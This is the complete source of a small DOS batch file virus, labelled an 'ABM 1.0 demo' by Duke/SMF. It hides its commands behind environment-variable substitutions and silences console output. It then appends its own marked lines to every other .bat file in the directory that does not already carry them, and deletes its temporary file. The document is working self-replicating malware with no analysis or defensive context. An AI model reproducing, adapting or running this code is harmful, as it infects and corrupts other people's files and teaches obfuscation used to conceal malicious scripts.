;@set cad=ctty
;@set wi=nul
;@%cad% %wi%
;@set bxx=if
;@set vrc="%0
;@set cad="
;@set gy=goto
;@set vic=;@
;@%bxx% %vrc%==%cad% %gy% %vic%
;@set cad="%1
;@set wi="@
;@set vrc=;@z
;@%bxx% %cad%==%wi% %gy% %vrc%
;@set cad=echo.
;@set au=@.bat
;@%cad%>%au%
;@set pui=find
;@set von=";@"
;@set cad=%0
;@%pui% %von%<%cad%>>%au%
;@set cad=for
;@set tul=%%b
;@set wi=in
;@set vrc=(*.bat)
;@set kvq=do
;@set plv=call
;@set def=@
;@%cad% %tul% %wi% %vrc% %kvq% %plv% %def% %def% %tul%
;@set cad=del
;@set wi=@.*
;@%cad% %wi%
;@%gy% %vic%
:;@z [ABM 1.0 demo] by Duke/SMF
;@set qnu=%2
;@%pui% %von%<%qnu%
;@set cad=errorlevel
;@set wi=1
;@set vrc=type
;@%bxx% %cad% %wi% %vrc% %au%>>%qnu%
:;@
